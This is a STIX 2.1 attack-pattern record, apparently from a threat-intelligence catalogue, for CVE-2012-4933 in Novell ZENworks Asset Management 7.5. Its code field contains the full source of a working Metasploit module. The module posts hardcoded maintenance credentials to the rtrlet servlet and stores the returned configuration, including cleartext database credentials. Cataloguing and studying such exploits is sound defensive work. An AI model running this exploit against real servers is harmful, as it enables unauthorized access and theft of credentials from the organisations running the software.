{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a037181c-5f19-403c-81ce-52f039ce6c45",
    "created": "2024-08-14T16:28:48.064451Z",
    "modified": "2024-08-14T16:28:48.064454Z",
    "name": "Novell ZENworks Asset Management 7.5 Configuration Access",
    "description": " This module exploits a hardcoded user and password for the GetConfig maintenance task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web Console and can be triggered by sending a specially crafted request to the rtrlet component allowing a remote unauthenticated user to retrieve the configuration parameters of Novell Zenworks Asset Managment, including the database credentials in clear text. This module has been successfully tested on Novell ZENworks Asset Management 7.5.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/zenworks_assetmanagement_getconfig.rb",
            "external_id": "zenworks_assetmanagement_getconfig.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4933"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/10/11/cve-2012-4933-novell-zenworks/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell ZENworks Asset Management 7.5 Configuration Access',\n      'Description'    => %q{\n          This module exploits a hardcoded user and password for the GetConfig maintenance\n        task in Novell ZENworks Asset Management 7.5. The vulnerability exists in the Web\n        Console and can be triggered by sending a specially crafted request to the rtrlet component,\n        allowing a remote unauthenticated user to retrieve the configuration parameters of\n        Novell Zenworks Asset Managment, including the database credentials in clear text.\n        This module has been successfully tested on Novell ZENworks Asset Management 7.5.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'juan vazquez' # Also the discoverer\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4933' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/10/11/cve-2012-4933-novell-zenworks/' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n      ])\n  end\n\n  def run_host(ip)\n\n    post_data = \"kb=&file=&absolute=&maintenance=GetConfigInfo_password&username=Ivanhoe&password=Scott&send=Submit\"\n\n    print_status(\"#{rhost}:#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'uri'          => '/rtrlet/rtr',\n      'method'       => 'POST',\n      'data'         => post_data,\n    }, 5)\n\n    if res and res.code == 200 and res.body =~ /<b>Rtrlet Servlet Configuration Parameters \\(live\\)<\\/b><br\\/>/\n      print_good(\"#{rhost}:#{rport} - File retrieved successfully!\")\n      path = store_loot(\n        'novell.zenworks_asset_management.config',\n        'text/html',\n        ip,\n        res.body,\n        nil,\n        \"Novell ZENworks Asset Management Configuration\"\n      )\n      print_status(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to retrieve configuration\")\n      return\n    end\n\n  end\nend\n"
}